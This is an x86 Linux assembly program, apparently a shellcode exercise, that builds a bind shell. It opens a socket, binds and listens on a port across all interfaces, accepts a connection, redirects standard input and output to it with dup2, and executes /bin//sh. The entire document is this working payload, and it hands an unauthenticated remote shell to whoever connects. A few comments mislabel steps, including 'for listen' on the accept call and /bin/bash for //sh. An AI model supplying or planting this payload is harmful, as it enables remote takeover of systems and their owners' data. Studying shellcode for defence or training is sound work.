global _start

section .text

_start:

;Create socket(AF_INET, SOCK_STREAM, 0);
;socket(2,1,0)

	push 0x66       	;syscall 102 for socketcall
	pop eax
	cdq			;zero out edx as a DWORD
	xor ebx, ebx		;zero out ebx register
	mov bl, 0x1     	;move the value of 0x1 to the ebx register for socket()

	xor esi, esi    	;clean up the esi register
	push esi        	;push 0x0 the first argument in socket in little endian last-first
	push ebx        	;push 0x1 the second argument in socket in little endian last-first
	push 0x2        	;push 0x2 the third argument in socket in little endian last-first

	mov ecx, esp    	;move arguments to ecx register

	int 0x80		;execute

	xchg esi, eax		;store socket file descriptor for later

;bind()

	push 0x66       	;syscall 102 for socketcall
	pop eax

	inc ebx			;increment ebx from 1 to 2 for bind()

;struct sockaddr arguments (2,050D,0)

	push edx		;INADDR_ANY = 0
	push WORD 0x050D	;port in network byte order
	push WORD bx		;AF_INET = 2
	mov ecx, esp		;move the stack to the ecx register

	push 0x10		;push size of to the stack 16
	push ecx		;push our struct sockaddr arguments
	push esi		;push our saved file descriptor
	mov ecx, esp		;move stack to ecx

	int 0x80		;execute

;listen() (sockfd, 0)

	mov al, 0x66		;syscall 102 for socketcall
	mov bl, 0x4		;set ebx to 4 for listen()
	push edx		;push 0x0 to the stack
	push esi		;push our saved file descriptor
	mov ecx, esp		;move stack to ecx

	int 0x80		;execute

;accept() (sockfd, 0, 0)

	mov al, 0x66		;syscall 102 for socketcall
	inc ebx			;increment ebx to 5 for listen
	push edx		;push 0x0 to the stack socklen_t
	push edx		;push 0x0 to the stack sockaddr
	push esi		;push our saved file descriptor
	mov ecx, esp		;move stack to ecx

	int 0x80		;execute

;dup2 redirect STDIN, STDOUT, STDERR

	xchg eax, ebx     	;put sockfd in ebx and 0x00000005 in eax 
	push 0x2		;counter = 2
	pop ecx			;pop it to ecx register

dloop:				;our loop
	mov al, 0x3f		;syscall 63 for dup2 0x3f
	int 0x80		;execute dup2
	dec ecx			;decrease ecx by 1
	jns dloop		;jmp if not negative

;execve /bin/bash
	mov al, 0x0b		;syscall for execve
	push edx		;nulls for stack
	push 0x68732f2f		;push //sh to the stack
	push 0x6e69622f		;push /bin to the stack
	mov ebx, esp		;move stack to ebx register
	inc ecx			;inc ecx register to 0
    	int 0x80            	;execute 


